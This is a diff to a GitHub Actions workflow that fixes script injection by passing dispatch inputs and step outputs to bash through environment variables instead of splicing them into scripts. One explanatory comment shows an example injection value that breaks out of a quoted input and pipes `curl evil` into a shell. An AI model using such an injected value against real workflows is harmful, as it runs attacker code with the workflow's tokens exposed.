@@ -115,12 +115,22 @@ jobs:
         env:
           GH_TOKEN: ${{ steps.tok-user.outputs.token || secrets.ESTATE_ADMIN_TOKEN }}
           ESTATE_ORGS: ''
+          # A workflow input NEVER appears in a `run:` body. GitHub evaluates
+          # a GitHub expression and splices the RESULT into the script text before bash
+          # parses it, so a dispatch with limit = `0"; curl evil | sh; #` runs
+          # arbitrary code with the App installation token in the environment.
+          # That is CWE-94 script injection; SonarCloud rated it E on new code
+          # and was right. Passed through `env:` the value arrives as DATA in a
+          # variable, and bash never re-parses it as syntax.
+          IN_APPLY: ${{ inputs.apply || false }}
+          IN_RECONCILE: ${{ inputs.reconcile_duplicates || false }}
+          IN_LIMIT: ${{ inputs.limit || '0' }}
         run: |
           set -euo pipefail
           args=()
-          [ "${{ inputs.apply || false }}" = "true" ] && args+=(--apply)
-          [ "${{ inputs.reconcile_duplicates || false }}" = "true" ] && args+=(--reconcile-duplicates)
-          [ "${{ inputs.limit || '0' }}" != "0" ] && args+=(--limit "${{ inputs.limit }}")
+          [ "$IN_APPLY" = "true" ] && args+=(--apply)
+          [ "$IN_RECONCILE" = "true" ] && args+=(--reconcile-duplicates)
+          [ "$IN_LIMIT" != "0" ] && args+=(--limit "$IN_LIMIT")
           rc=0
           ./scripts/apply-tag-ruleset-canon.sh "${args[@]+"${args[@]}"}" \
             | tee canon-user.tsv || rc=$?
@@ -135,11 +145,14 @@ jobs:
         env:
           GH_TOKEN: ${{ steps.tok-org.outputs.token || secrets.ESTATE_ADMIN_TOKEN }}
           ESTATE_ORGS: 'metadatastician'
+          # Same reason as the step above: inputs reach bash as data, not syntax.
+          IN_APPLY: ${{ inputs.apply || false }}
+          IN_RECONCILE: ${{ inputs.reconcile_duplicates || false }}
         run: |
           set -euo pipefail
           args=(--skip-user)
-          [ "${{ inputs.apply || false }}" = "true" ] && args+=(--apply)
-          [ "${{ inputs.reconcile_duplicates || false }}" = "true" ] && args+=(--reconcile-duplicates)
+          [ "$IN_APPLY" = "true" ] && args+=(--apply)
+          [ "$IN_RECONCILE" = "true" ] && args+=(--reconcile-duplicates)
           rc=0
           ./scripts/apply-tag-ruleset-canon.sh "${args[@]}" \
             | tee canon-org.tsv || rc=$?
@@ -158,9 +171,15 @@ jobs:
       # is not installed on an owner -- only the owner can fix that.
       - name: Fail while drift remains
         if: always()
+        env:
+          # A step output is attacker-influenced too once any earlier step echoes
+          # untrusted text into GITHUB_OUTPUT, and a single quote in the value
+          # would break out of the '...' this used to sit in. Read it as data.
+          RC_USER: ${{ steps.user.outputs.rc }}
+          RC_ORG: ${{ steps.org.outputs.rc }}
         run: |
           set -euo pipefail
-          u='${{ steps.user.outputs.rc }}'; o='${{ steps.org.outputs.rc }}'
+          u="$RC_USER"; o="$RC_ORG"
           echo "hyperpolymath rc=${u:-unrun}  metadatastician rc=${o:-unrun}"
           for f in canon-user.tsv canon-org.tsv; do
             [ -f "$f" ] || continue
